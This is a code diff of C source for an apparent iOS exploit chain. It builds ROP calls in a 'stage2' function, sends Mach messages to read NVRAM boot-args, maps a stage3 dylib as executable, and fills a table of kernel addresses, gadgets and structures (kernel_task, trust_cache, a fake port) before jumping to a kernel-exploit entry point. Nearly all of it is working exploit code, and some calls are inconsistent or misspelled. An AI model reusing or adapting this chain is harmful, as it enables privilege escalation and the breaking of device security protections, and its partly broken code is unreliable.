@@ -660,15 +660,16 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// fixup errno (comment that out if you want to debug)
 	// map the memory it uses
-	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
+	//CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
 
-#if 0
+#if 1
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
 	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
 
+	/*
 	// ghetto dlopen
 	// get a file descriptor for that dylib
 	DEFINE_ROP_VAR("dylib_fd",8,&buf);
@@ -696,6 +697,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// jump
 	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
+	*/
 
 
 	/*
@@ -726,10 +728,11 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 
+	*/
 
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
-
+	/*
 	DEFINE_ROP_VAR("a",8,&buf);
 	DEFINE_ROP_VAR("b",8,&buf);
 	ROP_VAR_ADD("a","a","b");
@@ -744,6 +747,105 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG("my_action",2);
 	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
 */
+    DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
+    CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);
+
+    DEFINE_ROP_VAR("master_port",sizeof(mach_port_t),tmp);
+    ROP_VAR_ARG_HOW_MANY(2);
+    ROP_VAR_ARG64("mach_host",1);
+    ROP_VAR_ARG("master_port",2);
+    CALL("host_get_io_master",0,0,0,0,0,0,0,0);
+
+    // implementing IOServiceGetMatchingService
+    CFMutableDictionaryRef myservice_dict = IOServiceMatching("IODTNVRAM");
+    CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
+    CFRelease(myservice_dict);
+    uint64_t data_length = CFDataGetLength(myservice_serialized);
+
+    // TODO: move those structs into a seperate file
+    struct GetMatchingService_Request {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        mach_msg_type_number_t matchingCnt;
+        char matching[4096];
+    };
+
+    struct GetMatchingService_Reply {
+        mach_msg_header_t Head;
+        mach_msg_body_t body;
+        mach_msg_port_descriptor_t service;
+        mach_msg_trailer_t trailer;
+    };
+
+    struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
+    memset(service_request,0,sizeof(struct GetMatchingService_Request));
+    service_request->NDR = NDR_record;
+    service_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    service_request->Head.msgh_id = 2880;
+    service_request->Head.msgh_reserved = 0;
+    service_request->matchingCnt = data_length;
+    memcpy(service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);
+
+    DEFINE_ROP_VAR("service_request",sizeof(struct GetMatchingService_Request),service_request);
+    ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
+    ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));
+
+    ROP_VAR_ARG_HOW_MANY(2);
+    ROP_VAR_ARG("service_request",1);
+    ROP_VAR_ARG64("reply_port",5);
+    CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
+
+	DEFINE_ROP_VAR("service",sizeof(mach_port_t),tmp);
+
+    ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));
+
+
+	struct get_property_request {
+		mach_msg_header_t Head;
+		NDR_record_t NDR;
+		mach_msg_type_number_t property_nameOffset;
+		mach_msg_type_number_t property_nameCnt;
+		char property_name[16];
+		mach_msg_type_number_t dataCnt;
+	};
+
+	struct get_property_reply {
+		mach_msg_header_t Head;
+		NDR_record_t NDR;
+		kern_return_t RetCode;
+		mach_msg_type_number_t dataCnt;
+		char data[4096];
+		mach_msg_trailer_t trailer;
+	};
+
+	union get_property_union {
+		struct get_property_request request;
+		struct get_property_reply reply;
+	};
+
+	union get_property_union * get_property_msg = malloc(sizeof(union get_property_union));
+	memset(get_property_msg,0,sizeof(union get_property_union));
+
+	get_property_msg->request.NDR = NDR_record;
+	get_property_msg->request.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    get_property_msg->request.Head.msgh_reserved = 0;
+	get_property_msg->request.Head.msgh_id = 2812;
+	get_property_msg->request.dataCnt = 4096;
+	snprintf(&get_property_msg->request.property_name,16,"boot-args");
+	get_property_msg->request.property_nameCnt = strlen(&get_property_msg->request.property_name);
+
+	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
+	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
+	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));
+																																																									
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("get_property_msg",1);
+	ROP_VAR_ARG64("reply_port",5);
+	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
+
+	printf("%d %d %d\n",offsetof(union get_property_union,request),offsetof(union get_property_union,reply.RetCode),offsetof(union get_property_union,reply.data));
+	
+
 	uint64_t * test_break_val = malloc(8);
 	*test_break_val = 0;
 	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
@@ -1332,8 +1434,95 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
 	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
-	// jump
-	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+	typedef struct {
+		struct {
+			kptr_t kernel_image_base;
+		} constant;
+
+		struct {
+			kptr_t copyin;
+			kptr_t copyout;
+			kptr_t current_task;
+			kptr_t get_bsdtask_info;
+			kptr_t vm_map_wire_external;
+			kptr_t vfs_context_current;
+			kptr_t vnode_lookup;
+			kptr_t osunserializexml;
+			kptr_t smalloc;
+
+			kptr_t ipc_port_alloc_special;
+			kptr_t ipc_kobject_set;
+			kptr_t ipc_port_make_send;
+		} funcs;
+
+		struct {
+			kptr_t add_x0_x0_ret;
+		} gadgets;
+
+		struct {
+			kptr_t realhost;
+			kptr_t zone_map;
+			kptr_t kernel_task;
+			kptr_t kern_proc;
+			kptr_t rootvnode;
+			kptr_t osboolean_true;
+			kptr_t trust_cache;
+		} data;
+
+		struct {
+			kptr_t iosurface_root_userclient;
+		} vtabs;
+
+		struct {
+			uint32_t is_task_offset;
+			uint32_t task_itk_self;
+			uint32_t itk_registered;
+			uint32_t ipr_size;
+			uint32_t sizeof_task;
+		} struct_offsets;
+
+		struct {
+			uint32_t create_outsize;
+			uint32_t create_surface;
+			uint32_t set_value;
+		} iosurface;
+
+		struct {
+			void (*write) (int fd,void * buf,uint64_t size);
+			kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
+			kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t init_port_count);
+			mach_port_name_t (*mach_task_self) ();
+			kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
+			kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
+			kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
+			kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
+			kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
+			kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
+			mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
+		} userland_funcs;
+	} offsets_t;
+	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
+	lib_offsets->userland_funcs.write = get_addr_from_name("write") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name("IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_ports_lookup = get_addr_from_name("mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_task_self = get_addr_from_name("mach_task_self") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_vm_remap = get_addr_from_name("mach_vm_remap") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_port_destroy = get_addr_from_name("mach_port_destory") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_port_deallocate = get_addr_from_name("mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_port_allocate = get_addr_from_name("mach_port_allocate") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_port_insert_right = get_addr_from_name("mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_ports_register = get_addr_from_name("mach_ports_register") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_msg = get_addr_from_name("mach_msg") - 0x180000000 + offsets->new_cache_addr;
+	// jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
+	ROP_VAR_ARG_HOW_MANY(6);
+	ROP_VAR_ARG("fakeport",1);
+	ROP_VAR_ARG("fake_client",2);
+	ROP_VAR_ARG64("kobj_client",3);
+	ROP_VAR_ARG64("task_pointer",4);
+	ROP_VAR_ARG64("kslide",5);
+	ROP_VAR_ARG64("the_one",6);
+	ROP_VAR_ARG("lib_offsets",7);
+	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0,0,0,0,0,0,0,0);
 
 
 
